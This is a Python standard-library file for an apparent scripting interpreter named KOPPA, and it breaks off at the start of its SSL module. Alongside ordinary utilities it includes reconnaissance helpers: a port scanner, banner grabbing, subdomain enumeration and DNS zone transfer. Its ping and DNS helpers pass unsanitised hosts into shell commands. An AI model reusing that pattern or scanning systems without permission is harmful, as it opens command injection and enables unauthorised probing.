"""
KOPPA Standard Library — Native Python implementations
All modules return RuntimeValue objects for interpreter compatibility.
"""

import hashlib, hmac, base64, json, re, os, socket, ssl, math, random
import subprocess, urllib.request, urllib.parse, urllib.error
import datetime, time as _time, struct, string, ipaddress, ftplib, smtplib
from pathlib import Path
from typing import Any, Dict, Callable, List

# ── import RuntimeValue lazily to avoid circular imports ─────────────────────
def _rv(value, vtype="any"):
    from interpreter import RuntimeValue
    return RuntimeValue(value, vtype)

def _v(x):
    """Unwrap RuntimeValue → raw Python value (one level)."""
    from interpreter import RuntimeValue
    return x.value if isinstance(x, RuntimeValue) else x

def _deep_v(x):
    """Recursively unwrap RuntimeValue → plain Python value."""
    from interpreter import RuntimeValue
    if isinstance(x, RuntimeValue):
        x = x.value
    if isinstance(x, dict):
        return {k: _deep_v(v) for k, v in x.items()}
    if isinstance(x, list):
        return [_deep_v(i) for i in x]
    return x

def _arr(items, vtype="any"):
    return _rv([_rv(i, vtype) if not hasattr(i, 'value') else i for i in items], "array")

# ═══════════════════════════════════════════════════════════════════════
# CORE UTILITIES
# ═══════════════════════════════════════════════════════════════════════

def str_module() -> Dict[str, Callable]:
    return {
        "upper":      lambda s: _rv(str(_v(s)).upper(), "string"),
        "lower":      lambda s: _rv(str(_v(s)).lower(), "string"),
        "strip":      lambda s: _rv(str(_v(s)).strip(), "string"),
        "lstrip":     lambda s: _rv(str(_v(s)).lstrip(), "string"),
        "rstrip":     lambda s: _rv(str(_v(s)).rstrip(), "string"),
        "title":      lambda s: _rv(str(_v(s)).title(), "string"),
        "reverse":    lambda s: _rv(str(_v(s))[::-1], "string"),
        "len":        lambda s: _rv(len(str(_v(s))), "int"),
        "contains":   lambda s, sub: _rv(_v(sub) in str(_v(s)), "bool"),
        "startswith": lambda s, p: _rv(str(_v(s)).startswith(_v(p)), "bool"),
        "endswith":   lambda s, p: _rv(str(_v(s)).endswith(_v(p)), "bool"),
        "find":       lambda s, sub: _rv(str(_v(s)).find(_v(sub)), "int"),
        "count":      lambda s, sub: _rv(str(_v(s)).count(_v(sub)), "int"),
        "replace":    lambda s, old, new="": _rv(str(_v(s)).replace(_v(old), _v(new)), "string"),
        "slice":      lambda s, a, b=None: _rv(str(_v(s))[_v(a):(_v(b) if b is not None else None)], "string"),
        "split":      lambda s, sep=None: _arr([_rv(x, "string") for x in str(_v(s)).split(_v(sep) if sep else None)]),
        "lines":      lambda s: _arr([_rv(l, "string") for l in str(_v(s)).splitlines()]),
        "chars":      lambda s: _arr([_rv(c, "string") for c in str(_v(s))]),
        "join":       lambda sep, arr: _rv(str(_v(sep)).join([str(_v(x)) for x in _v(arr)]), "string"),
        "pad_left":   lambda s, n, c=" ": _rv(str(_v(s)).rjust(_v(n), _v(c) if c else " "), "string"),
        "pad_right":  lambda s, n, c=" ": _rv(str(_v(s)).ljust(_v(n), _v(c) if c else " "), "string"),
        "center":     lambda s, n, c=" ": _rv(str(_v(s)).center(_v(n), _v(c) if c else " "), "string"),
        "repeat":     lambda s, n: _rv(str(_v(s)) * _v(n), "string"),
        "is_digit":   lambda s: _rv(str(_v(s)).isdigit(), "bool"),
        "is_alpha":   lambda s: _rv(str(_v(s)).isalpha(), "bool"),
        "is_alnum":   lambda s: _rv(str(_v(s)).isalnum(), "bool"),
        "is_empty":   lambda s: _rv(len(str(_v(s)).strip()) == 0, "bool"),
        "to_int":     lambda s: _rv(int(str(_v(s)).strip()), "int"),
        "to_float":   lambda s: _rv(float(str(_v(s)).strip()), "float"),
        "format":     lambda tpl, *args: _rv(str(_v(tpl)).format(*[_v(a) for a in args]), "string"),
        "truncate":   lambda s, n, suf="...": _rv(str(_v(s))[:_v(n)] + _v(suf) if len(str(_v(s))) > _v(n) else str(_v(s)), "string"),
        "wrap":       lambda s, n: _arr([_rv(str(_v(s))[i:i+_v(n)], "string") for i in range(0, len(str(_v(s))), _v(n))]),
    }


def list_module() -> Dict[str, Callable]:
    def _list(x): return _v(x) if isinstance(_v(x), list) else list(_v(x))
    return {
        "len":      lambda a: _rv(len(_list(a)), "int"),
        "push":     lambda a, x: (a.value.append(x), _rv(None, "null"))[1] if hasattr(a, 'value') and isinstance(a.value, list) else _rv(None, "null"),
        "pop":      lambda a: (a.value.pop(), _rv(None, "null"))[0] if hasattr(a, 'value') and isinstance(a.value, list) else _rv(None, "null"),
        "first":    lambda a: _list(a)[0] if _list(a) else _rv(None, "null"),
        "last":     lambda a: _list(a)[-1] if _list(a) else _rv(None, "null"),
        "reverse":  lambda a: _arr(list(reversed(_list(a)))),
        "sort":     lambda a: _arr(sorted(_list(a), key=lambda x: _v(x))),
        "unique":   lambda a: _arr(list({_v(x): x for x in _list(a)}.values())),
        "flatten":  lambda a: _arr([item for sub in _list(a) for item in (sub if isinstance(sub, list) else [sub])]),
        "contains": lambda a, x: _rv(any(_v(i) == _v(x) for i in _list(a)), "bool"),
        "index":    lambda a, x: _rv(next((i for i, v in enumerate(_list(a)) if _v(v) == _v(x)), -1), "int"),
        "count":    lambda a, x: _rv(sum(1 for i in _list(a) if _v(i) == _v(x)), "int"),
        "slice":    lambda a, s, e=None: _arr(_list(a)[_v(s):(_v(e) if e is not None else None)]),
        "join":     lambda a, sep="": _rv(_v(sep).join([str(_v(x)) for x in _list(a)]), "string"),
        "filter":   lambda a, fn: _arr([x for x in _list(a) if _v(fn(x))]),
        "map":      lambda a, fn: _arr([fn(x) for x in _list(a)]),
        "reduce":   lambda a, fn, init=None: __import__('functools').reduce(lambda acc, x: fn(acc, x), _list(a), init) if init else __import__('functools').reduce(lambda acc, x: fn(acc, x), _list(a)),
        "sum":      lambda a: _rv(sum(_v(x) for x in _list(a)), "number"),
        "min":      lambda a: min(_list(a), key=lambda x: _v(x)),
        "max":      lambda a: max(_list(a), key=lambda x: _v(x)),
        "avg":      lambda a: _rv(sum(_v(x) for x in _list(a)) / len(_list(a)) if _list(a) else 0, "float"),
        "zip":      lambda a, b: _arr([_arr([x, y]) for x, y in zip(_list(a), _list(b))]),
        "chunk":    lambda a, n: _arr([_arr(_list(a)[i:i+_v(n)]) for i in range(0, len(_list(a)), _v(n))]),
        "enumerate":lambda a: _arr([_arr([_rv(i, "int"), x]) for i, x in enumerate(_list(a))]),
        "range":    lambda s, e=None, step=1: _arr([_rv(i, "int") for i in (range(_v(s)) if e is None else range(_v(s), _v(e), _v(step)))]),
        "shuffle":  lambda a: (_arr(random.sample(_list(a), len(_list(a))))),
        "sample":   lambda a, n: _arr(random.sample(_list(a), min(_v(n), len(_list(a))))),
    }


def math_module() -> Dict[str, Callable]:
    return {
        "abs":      lambda x: _rv(abs(_v(x)), "number"),
        "floor":    lambda x: _rv(math.floor(_v(x)), "int"),
        "ceil":     lambda x: _rv(math.ceil(_v(x)), "int"),
        "round":    lambda x, n=0: _rv(round(_v(x), _v(n)), "number"),
        "sqrt":     lambda x: _rv(math.sqrt(_v(x)), "float"),
        "pow":      lambda x, y: _rv(math.pow(_v(x), _v(y)), "float"),
        "log":      lambda x, base=None: _rv(math.log(_v(x), _v(base)) if base else math.log(_v(x)), "float"),
        "log2":     lambda x: _rv(math.log2(_v(x)), "float"),
        "log10":    lambda x: _rv(math.log10(_v(x)), "float"),
        "sin":      lambda x: _rv(math.sin(_v(x)), "float"),
        "cos":      lambda x: _rv(math.cos(_v(x)), "float"),
        "tan":      lambda x: _rv(math.tan(_v(x)), "float"),
        "min":      lambda a, b: _rv(min(_v(a), _v(b)), "number"),
        "max":      lambda a, b: _rv(max(_v(a), _v(b)), "number"),
        "sum":      lambda arr: _rv(sum(_v(x) for x in _v(arr)), "number"),
        "avg":      lambda arr: _rv(sum(_v(x) for x in _v(arr)) / len(_v(arr)) if _v(arr) else 0, "float"),
        "clamp":    lambda x, lo, hi: _rv(max(_v(lo), min(_v(hi), _v(x))), "number"),
        "pi":       lambda: _rv(math.pi, "float"),
        "e":        lambda: _rv(math.e, "float"),
        "inf":      lambda: _rv(math.inf, "float"),
        "is_nan":   lambda x: _rv(math.isnan(_v(x)), "bool"),
        "gcd":      lambda a, b: _rv(math.gcd(int(_v(a)), int(_v(b))), "int"),
        "lcm":      lambda a, b: _rv(abs(_v(a) * _v(b)) // math.gcd(int(_v(a)), int(_v(b))), "int"),
        "factorial":lambda x: _rv(math.factorial(int(_v(x))), "int"),
        "hex":      lambda x: _rv(hex(int(_v(x))), "string"),
        "bin":      lambda x: _rv(bin(int(_v(x))), "string"),
        "oct":      lambda x: _rv(oct(int(_v(x))), "string"),
        "from_hex": lambda s: _rv(int(str(_v(s)), 16), "int"),
    }


def rand_module() -> Dict[str, Callable]:
    return {
        "int":      lambda lo=0, hi=100: _rv(random.randint(_v(lo), _v(hi)), "int"),
        "float":    lambda lo=0.0, hi=1.0: _rv(random.uniform(_v(lo), _v(hi)), "float"),
        "bool":     lambda: _rv(random.choice([True, False]), "bool"),
        "choice":   lambda arr: random.choice(_v(arr)),
        "choices":  lambda arr, n=1: _arr(random.choices(_v(arr), k=_v(n))),
        "shuffle":  lambda arr: _arr(random.sample(_v(arr), len(_v(arr)))),
        "string":   lambda n=16, charset=None: _rv(''.join(random.choices(_v(charset) if charset else string.ascii_letters + string.digits, k=_v(n))), "string"),
        "hex":      lambda n=16: _rv(''.join(random.choices('0123456789abcdef', k=_v(n))), "string"),
        "uuid":     lambda: _rv(str(__import__('uuid').uuid4()), "string"),
        "bytes":    lambda n=16: _rv(os.urandom(_v(n)).hex(), "string"),
        "seed":     lambda s: (random.seed(_v(s)), _rv(None, "null"))[1],
        "ip":       lambda: _rv(f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}", "string"),
        "mac":      lambda: _rv(':'.join([f'{random.randint(0,255):02x}' for _ in range(6)]), "string"),
        "port":     lambda: _rv(random.randint(1024, 65535), "int"),
        "ua":       lambda: _rv(random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        ]), "string"),
    }


def time_module() -> Dict[str, Callable]:
    def _now(): return datetime.datetime.now()
    return {
        "now":       lambda: _rv(str(_now()), "string"),
        "timestamp": lambda: _rv(int(_time.time()), "int"),
        "ms":        lambda: _rv(int(_time.time() * 1000), "int"),
        "sleep":     lambda s: (_time.sleep(_v(s)), _rv(None, "null"))[1],
        "date":      lambda: _rv(_now().strftime("%Y-%m-%d"), "string"),
        "clock":     lambda: _rv(_now().strftime("%H:%M:%S"), "string"),
        "format":    lambda fmt: _rv(_now().strftime(_v(fmt)), "string"),
        "year":      lambda: _rv(_now().year, "int"),
        "month":     lambda: _rv(_now().month, "int"),
        "day":       lambda: _rv(_now().day, "int"),
        "hour":      lambda: _rv(_now().hour, "int"),
        "minute":    lambda: _rv(_now().minute, "int"),
        "second":    lambda: _rv(_now().second, "int"),
        "since":     lambda ts: _rv(int(_time.time()) - _v(ts), "int"),
        "delta":     lambda s: _rv(str(datetime.timedelta(seconds=_v(s))), "string"),
        "parse":     lambda s, fmt="%Y-%m-%d %H:%M:%S": _rv(str(datetime.datetime.strptime(_v(s), _v(fmt))), "string"),
        "timer":     lambda: _rv(_time.perf_counter(), "float"),
    }


def regex_module() -> Dict[str, Callable]:
    return {
        "match":    lambda pattern, s: _rv(bool(re.match(_v(pattern), _v(s))), "bool"),
        "search":   lambda pattern, s: _rv(bool(re.search(_v(pattern), _v(s))), "bool"),
        "findall":  lambda pattern, s: _arr([_rv(x, "string") for x in re.findall(_v(pattern), _v(s))]),
        "findone":  lambda pattern, s: _rv(_regex_findone(_v(pattern), _v(s)), "string"),
        "replace":  lambda pattern, repl, s: _rv(re.sub(_v(pattern), _v(repl), _v(s)), "string"),
        "split":    lambda pattern, s: _arr([_rv(x, "string") for x in re.split(_v(pattern), _v(s))]),
        "groups":   lambda pattern, s: _arr([_rv(g, "string") for g in (_regex_groups(_v(pattern), _v(s)))]),
        "extract_ips":     lambda s: _arr([_rv(x, "string") for x in re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', _v(s))]),
        "extract_emails":  lambda s: _arr([_rv(x, "string") for x in re.findall(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}', _v(s))]),
        "extract_urls":    lambda s: _arr([_rv(x, "string") for x in re.findall(r'https?://[^\s"\'<>]+', _v(s))]),
        "extract_domains": lambda s: _arr([_rv(x, "string") for x in re.findall(r'\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}\b', _v(s))]),
        "extract_hashes":  lambda s: _arr([_rv(x, "string") for x in re.findall(r'\b[a-fA-F0-9]{32,64}\b', _v(s))]),
        "is_ip":    lambda s: _rv(bool(re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', _v(s))), "bool"),
        "is_email": lambda s: _rv(bool(re.match(r'^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$', _v(s))), "bool"),
        "is_url":   lambda s: _rv(bool(re.match(r'^https?://', _v(s))), "bool"),
        "is_hex":   lambda s: _rv(bool(re.match(r'^[0-9a-fA-F]+$', _v(s))), "bool"),
        "count":    lambda pattern, s: _rv(len(re.findall(_v(pattern), _v(s))), "int"),
        "escape":   lambda s: _rv(re.escape(_v(s)), "string"),
    }


def json_module() -> Dict[str, Callable]:
    return {
        "parse":     lambda s: _rv(json.loads(_v(s)), "dict"),
        "stringify": lambda obj: _rv(json.dumps(_v(obj), indent=None, default=str), "string"),
        "pretty":    lambda obj: _rv(json.dumps(_v(obj), indent=2, default=str), "string"),
        "get":       lambda obj, key: _rv(_v(obj).get(_v(key)) if isinstance(_v(obj), dict) else None, "any"),
        "set":       lambda obj, key, val: (_v(obj).update({_v(key): _v(val)}), _rv(_v(obj), "dict"))[1] if isinstance(_v(obj), dict) else _rv(None, "null"),
        "keys":      lambda obj: _arr([_rv(k, "string") for k in _v(obj).keys()]) if isinstance(_v(obj), dict) else _arr([]),
        "values":    lambda obj: _arr(list(_v(obj).values())) if isinstance(_v(obj), dict) else _arr([]),
        "has":       lambda obj, key: _rv(_v(key) in _v(obj), "bool") if isinstance(_v(obj), dict) else _rv(False, "bool"),
        "merge":     lambda a, b: _rv({**(_v(a) if isinstance(_v(a), dict) else {}), **(_v(b) if isinstance(_v(b), dict) else {})}, "dict"),
        "validate":  lambda s: _rv(_try_json(_v(s)), "bool"),
        "minify":    lambda s: _rv(json.dumps(json.loads(_v(s)), separators=(',', ':')), "string"),
        "loads_safe":lambda s: _rv(_safe_json(_v(s)), "any"),
    }

def _regex_findone(pattern, s):
    m = re.search(pattern, s)
    return m.group(0) if m else None

def _regex_groups(pattern, s):
    m = re.search(pattern, s)
    return m.groups() if m else []

def _try_json(s):
    try: json.loads(s); return True
    except: return False

def _safe_json(s):
    try: return json.loads(s)
    except: return None


def fs_module() -> Dict[str, Callable]:
    return {
        "read":       lambda p: _rv(Path(_v(p)).read_text(encoding='utf-8', errors='ignore'), "string"),
        "write":      lambda p, c: (Path(_v(p)).write_text(_v(c), encoding='utf-8'), _rv(None, "null"))[1],
        "append":     lambda p, c: (Path(_v(p)).open('a', encoding='utf-8').write(_v(c)), _rv(None, "null"))[1],
        "read_bytes": lambda p: _rv(Path(_v(p)).read_bytes().hex(), "string"),
        "write_bytes":lambda p, h: (Path(_v(p)).write_bytes(bytes.fromhex(_v(h))), _rv(None, "null"))[1],
        "exists":     lambda p: _rv(Path(_v(p)).exists(), "bool"),
        "is_file":    lambda p: _rv(Path(_v(p)).is_file(), "bool"),
        "is_dir":     lambda p: _rv(Path(_v(p)).is_dir(), "bool"),
        "delete":     lambda p: (Path(_v(p)).unlink(missing_ok=True), _rv(None, "null"))[1],
        "mkdir":      lambda p, parents=True: (Path(_v(p)).mkdir(parents=bool(_v(parents)), exist_ok=True), _rv(None, "null"))[1],
        "list":       lambda p=".": _arr([_rv(str(f), "string") for f in Path(_v(p)).iterdir()]),
        "list_files": lambda p=".": _arr([_rv(str(f), "string") for f in Path(_v(p)).rglob('*') if f.is_file()]),
        "size":       lambda p: _rv(Path(_v(p)).stat().st_size if Path(_v(p)).exists() else 0, "int"),
        "name":       lambda p: _rv(Path(_v(p)).name, "string"),
        "stem":       lambda p: _rv(Path(_v(p)).stem, "string"),
        "extension":  lambda p: _rv(Path(_v(p)).suffix, "string"),
        "parent":     lambda p: _rv(str(Path(_v(p)).parent), "string"),
        "join":       lambda *parts: _rv(str(Path(*[_v(p) for p in parts])), "string"),
        "copy":       lambda src, dst: (__import__('shutil').copy2(_v(src), _v(dst)), _rv(None, "null"))[1],
        "move":       lambda src, dst: (__import__('shutil').move(_v(src), _v(dst)), _rv(None, "null"))[1],
        "cwd":        lambda: _rv(str(Path.cwd()), "string"),
        "home":       lambda: _rv(str(Path.home()), "string"),
        "lines":      lambda p: _arr([_rv(l.rstrip('\n'), "string") for l in Path(_v(p)).open(encoding='utf-8', errors='ignore')]),
        "write_json": lambda p, obj: (Path(_v(p)).write_text(json.dumps(_v(obj), indent=2, default=str)), _rv(None, "null"))[1],
        "read_json":  lambda p: _rv(json.loads(Path(_v(p)).read_text()), "dict"),
        "glob":       lambda p, pattern: _arr([_rv(str(f), "string") for f in Path(_v(p)).glob(_v(pattern))]),
        "temp":       lambda suffix="": _rv(str(__import__('tempfile').mktemp(suffix=_v(suffix))), "string"),
    }


def os_module() -> Dict[str, Callable]:
    return {
        "exec":     lambda cmd, shell=True: _run_cmd(_v(cmd), bool(_v(shell))),
        "shell":    lambda cmd: _run_cmd(_v(cmd), True),
        "which":    lambda cmd: _rv(__import__('shutil').which(_v(cmd)), "string"),
        "env":      lambda k, default="": _rv(os.environ.get(_v(k), _v(default)), "string"),
        "env_all":  lambda: _rv(dict(os.environ), "dict"),
        "set_env":  lambda k, v: (os.environ.update({_v(k): _v(v)}), _rv(None, "null"))[1],
        "platform": lambda: _rv(__import__('sys').platform, "string"),
        "arch":     lambda: _rv(__import__('platform').machine(), "string"),
        "hostname": lambda: _rv(socket.gethostname(), "string"),
        "username": lambda: _rv(os.environ.get('USERNAME') or os.environ.get('USER') or 'unknown', "string"),
        "pid":      lambda: _rv(os.getpid(), "int"),
        "cwd":      lambda: _rv(os.getcwd(), "string"),
        "chdir":    lambda p: (os.chdir(_v(p)), _rv(None, "null"))[1],
        "processes":lambda: _rv_exec("tasklist" if os.name == "nt" else "ps aux"),
        "kill":     lambda pid: (os.kill(int(_v(pid)), 9), _rv(None, "null"))[1],
        "sleep":    lambda s: (_time.sleep(_v(s)), _rv(None, "null"))[1],
        "is_root":  lambda: _rv(os.getuid() == 0 if hasattr(os, 'getuid') else False, "bool"),
        "is_win":   lambda: _rv(os.name == 'nt', "bool"),
        "is_linux": lambda: _rv(__import__('sys').platform.startswith('linux'), "bool"),
        "is_mac":   lambda: _rv(__import__('sys').platform == 'darwin', "bool"),
        "python":   lambda: _rv(__import__('sys').version.split()[0], "string"),
    }

def _run_cmd(cmd, shell=True):
    try:
        r = subprocess.run(cmd, shell=shell, capture_output=True, text=True, timeout=30)
        return _rv({"stdout": r.stdout, "stderr": r.stderr, "code": r.returncode}, "exec_result")
    except Exception as e:
        return _rv({"stdout": "", "stderr": str(e), "code": -1}, "exec_result")

def _rv_exec(cmd):
    try:
        return _rv(subprocess.check_output(cmd, shell=True, text=True, timeout=5), "string")
    except: return _rv("", "string")


def color_module() -> Dict[str, Callable]:
    C = {
        "red": "\033[31m", "green": "\033[32m", "yellow": "\033[33m",
        "blue": "\033[34m", "purple": "\033[35m", "cyan": "\033[36m",
        "white": "\033[37m", "bright_red": "\033[91m", "bright_green": "\033[92m",
        "bright_yellow": "\033[93m", "bright_blue": "\033[94m",
        "bright_cyan": "\033[96m", "bold": "\033[1m", "dim": "\033[2m",
        "underline": "\033[4m", "blink": "\033[5m", "reset": "\033[0m",
    }
    def _col(s, code): return _rv(f"{code}{_v(s)}\033[0m", "string")
    m = {k: (lambda s, c=v: _col(s, c)) for k, v in C.items()}
    m["reset"] = lambda: _rv("\033[0m", "string")
    m["print"] = lambda s, col="white": (print(f"{C.get(_v(col), '')}{_v(s)}\033[0m"), _rv(None, "null"))[1]
    m["strip"] = lambda s: _rv(re.sub(r'\033\[[0-9;]*m', '', _v(s)), "string")
    return m


def fmt_module() -> Dict[str, Callable]:
    return {
        "banner":    lambda text, char="=": _rv(_banner(_v(text), _v(char)), "string"),
        "box":       lambda text: _rv(_box(_v(text)), "string"),
        "table":     lambda headers, rows: _rv(_table(_v(headers), _v(rows)), "string"),
        "progress":  lambda n, total, w=40: _rv(_progress(int(_v(n)), int(_v(total)), int(_v(w))), "string"),
        "bar":       lambda pct, w=20, fill="█", empty="░": _rv(_bar(float(_v(pct)), int(_v(w)), _v(fill), _v(empty)), "string"),
        "hr":        lambda char="-", w=60: _rv(_v(char) * _v(w), "string"),
        "pad":       lambda s, n, c=" ": _rv(str(_v(s)).ljust(_v(n), _v(c)), "string"),
        "center":    lambda s, n, c=" ": _rv(str(_v(s)).center(_v(n), _v(c)), "string"),
        "truncate":  lambda s, n: _rv(str(_v(s))[:_v(n)] + "..." if len(str(_v(s))) > _v(n) else str(_v(s)), "string"),
        "bytes":     lambda n: _rv(_fmt_bytes(int(_v(n))), "string"),
        "num":       lambda n: _rv(f"{_v(n):,}", "string"),
        "percent":   lambda x, total: _rv(f"{(_v(x)/_v(total)*100):.1f}%" if _v(total) else "0%", "string"),
        "columns":   lambda items, cols=3: _rv(_columns(_v(items), int(_v(cols))), "string"),
    }

def _banner(text, char="="):
    line = char * (len(text) + 4)
    return f"\n{line}\n  {text}\n{line}\n"

def _box(text):
    lines = text.split('\n')
    w = max(len(l) for l in lines)
    top = "┌" + "─" * (w + 2) + "┐"
    bot = "└" + "─" * (w + 2) + "┘"
    mid = "\n".join(f"│ {l.ljust(w)} │" for l in lines)
    return f"{top}\n{mid}\n{bot}"

def _table(headers, rows):
    if not headers: return ""
    headers = [str(h.value if hasattr(h, 'value') else h) for h in headers]
    rows = [[str(c.value if hasattr(c, 'value') else c) for c in (r.value if hasattr(r, 'value') else r)] for r in rows]
    widths = [max(len(headers[i]), max((len(r[i]) for r in rows if i < len(r)), default=0)) for i in range(len(headers))]
    sep = "+" + "+".join("-" * (w + 2) for w in widths) + "+"
    hdr = "|" + "|".join(f" {headers[i].ljust(widths[i])} " for i in range(len(headers))) + "|"
    body = "\n".join("|" + "|".join(f" {(r[i] if i < len(r) else '').ljust(widths[i])} " for i in range(len(headers))) + "|" for r in rows)
    return f"{sep}\n{hdr}\n{sep}\n{body}\n{sep}"

def _progress(n, total, w=40):
    pct = n / total if total else 0
    filled = int(w * pct)
    bar = "█" * filled + "░" * (w - filled)
    return f"[{bar}] {n}/{total} ({pct*100:.1f}%)"

def _bar(pct, w=20, fill="█", empty="░"):
    filled = int(w * min(pct, 1.0))
    return fill * filled + empty * (w - filled)

def _fmt_bytes(n):
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if n < 1024: return f"{n:.1f} {unit}"
        n /= 1024
    return f"{n:.1f} PB"

def _columns(items, cols=3):
    items = [str(x.value if hasattr(x, 'value') else x) for x in items]
    rows = [items[i:i+cols] for i in range(0, len(items), cols)]
    w = max((len(x) for x in items), default=0) + 2
    return "\n".join("  ".join(x.ljust(w) for x in row) for row in rows)


# ═══════════════════════════════════════════════════════════════════════
# NETWORK
# ═══════════════════════════════════════════════════════════════════════

def net_module() -> Dict[str, Callable]:
    return {
        "tcp_connect":  lambda host, port, timeout=3: _tcp_connect(_v(host), int(_v(port)), float(_v(timeout))),
        "tcp_banner":   lambda host, port, timeout=3: _tcp_banner(_v(host), int(_v(port)), float(_v(timeout))),
        "udp_send":     lambda host, port, data="": _udp_send(_v(host), int(_v(port)), _v(data)),
        "ping":         lambda host, count=1: _ping(_v(host), int(_v(count))),
        "ip_info":      lambda ip: _ip_info(_v(ip)),
        "is_up":        lambda host: _rv(_is_up(_v(host)), "bool"),
        "local_ip":     lambda: _rv(socket.gethostbyname(socket.gethostname()), "string"),
        "public_ip":    lambda: _public_ip(),
        "cidr_hosts":   lambda cidr: _arr([_rv(str(h), "string") for h in ipaddress.ip_network(_v(cidr), strict=False).hosts()]),
        "port_range":   lambda host, start, end, timeout=0.5: _port_range(_v(host), int(_v(start)), int(_v(end)), float(_v(timeout))),
        "service_name": lambda port: _rv(socket.getservbyport(int(_v(port)), 'tcp') if _try_service(int(_v(port))) else "unknown", "string"),
        "reverse_dns":  lambda ip: _rv(_rev_dns(_v(ip)), "string"),
        "geo_ip":       lambda ip: _geo_ip(_v(ip)),
        "mac_lookup":   lambda mac: _rv(mac[:8].upper(), "string"),
    }

def _tcp_connect(host, port, timeout=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        r = s.connect_ex((host, port))
        s.close()
        return _rv(r == 0, "bool")
    except: return _rv(False, "bool")

def _tcp_banner(host, port, timeout=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.send(b"HEAD / HTTP/1.0\r\n\r\n")
        banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
        s.close()
        return _rv(banner, "string")
    except: return _rv("", "string")

def _udp_send(host, port, data=""):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.sendto(data.encode(), (host, port))
        resp, _ = s.recvfrom(1024)
        return _rv(resp.decode('utf-8', errors='ignore'), "string")
    except: return _rv("", "string")

def _ping(host, count=1):
    cmd = f"ping -n {count} {host}" if os.name == 'nt' else f"ping -c {count} {host}"
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
        return _rv({"output": r.stdout, "success": r.returncode == 0}, "dict")
    except: return _rv({"output": "", "success": False}, "dict")

def _ip_info(ip):
    try:
        addr = ipaddress.ip_address(ip)
        return _rv({
            "ip": str(addr), "version": addr.version,
            "is_private": addr.is_private, "is_loopback": addr.is_loopback,
            "is_multicast": addr.is_multicast, "reverse": _rev_dns(ip),
        }, "dict")
    except: return _rv({"ip": ip, "error": "invalid"}, "dict")

def _is_up(host):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        r = s.connect_ex((host, 80))
        s.close()
        return r == 0
    except: return False

def _public_ip():
    try:
        with urllib.request.urlopen("https://api.ipify.org", timeout=5) as r:
            return _rv(r.read().decode(), "string")
    except: return _rv("unknown", "string")

def _port_range(host, start, end, timeout=0.5):
    open_ports = []
    for port in range(start, end + 1):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            if s.connect_ex((host, port)) == 0:
                open_ports.append(_rv(port, "int"))
            s.close()
        except: pass
    return _arr(open_ports)

def _try_service(port):
    try: socket.getservbyport(port, 'tcp'); return True
    except: return False

def _rev_dns(ip):
    try: return socket.gethostbyaddr(ip)[0]
    except: return ip

def _geo_ip(ip):
    try:
        with urllib.request.urlopen(f"http://ip-api.com/json/{ip}?fields=country,city,isp,org,lat,lon", timeout=5) as r:
            return _rv(json.loads(r.read()), "dict")
    except: return _rv({"error": "lookup failed"}, "dict")


def dns_module() -> Dict[str, Callable]:
    return {
        "resolve":   lambda h: _rv(socket.gethostbyname(_v(h)), "string"),
        "resolve_all":lambda h: _arr([_rv(ip, "string") for ip in socket.gethostbyname_ex(_v(h))[2]]),
        "reverse":   lambda ip: _rv(_rev_dns(_v(ip)), "string"),
        "hostname":  lambda: _rv(socket.gethostname(), "string"),
        "mx":        lambda domain: _dns_query(_v(domain), 'MX'),
        "ns":        lambda domain: _dns_query(_v(domain), 'NS'),
        "txt":       lambda domain: _dns_query(_v(domain), 'TXT'),
        "cname":     lambda domain: _dns_query(_v(domain), 'CNAME'),
        "a":         lambda domain: _dns_query(_v(domain), 'A'),
        "aaaa":      lambda domain: _dns_query(_v(domain), 'AAAA'),
        "zone_transfer": lambda domain, ns: _zone_transfer(_v(domain), _v(ns)),
        "enum_subdomains": lambda domain, wordlist: _enum_subs(_v(domain), _v(wordlist)),
        "is_valid":  lambda h: _rv(_is_valid_host(_v(h)), "bool"),
        "wildcard":  lambda domain: _rv(_has_wildcard(_v(domain)), "bool"),
    }

def _dns_query(domain, rtype):
    try:
        import dns.resolver
        answers = dns.resolver.resolve(domain, rtype)
        return _arr([_rv(str(r), "string") for r in answers])
    except ImportError:
        result = subprocess.run(f"nslookup -type={rtype} {domain}", shell=True, capture_output=True, text=True, timeout=5)
        return _rv(result.stdout, "string")
    except Exception as e:
        return _rv(str(e), "string")

def _zone_transfer(domain, ns):
    try:
        import dns.zone, dns.query
        z = dns.zone.from_xfr(dns.query.xfr(ns, domain))
        return _arr([_rv(str(n) + '.' + domain, "string") for n in z.nodes.keys()])
    except: return _rv("Zone transfer failed or not allowed", "string")

def _enum_subs(domain, wordlist):
    found = []
    words = _v(wordlist) if isinstance(_v(wordlist), list) else str(_v(wordlist)).split('\n')
    for word in words[:100]:
        sub = f"{_v(word) if hasattr(word, 'value') else word}.{domain}"
        try:
            socket.gethostbyname(sub)
            found.append(_rv(sub, "string"))
        except: pass
    return _arr(found)

def _is_valid_host(h):
    try: socket.getaddrinfo(h, None); return True
    except: return False

def _has_wildcard(domain):
    try:
        rnd = f"{''.join(random.choices(string.ascii_lowercase, k=12))}.{domain}"
        socket.gethostbyname(rnd)
        return True
    except: return False


def ssl_module() -> Dict[str, Callable]:
    return {
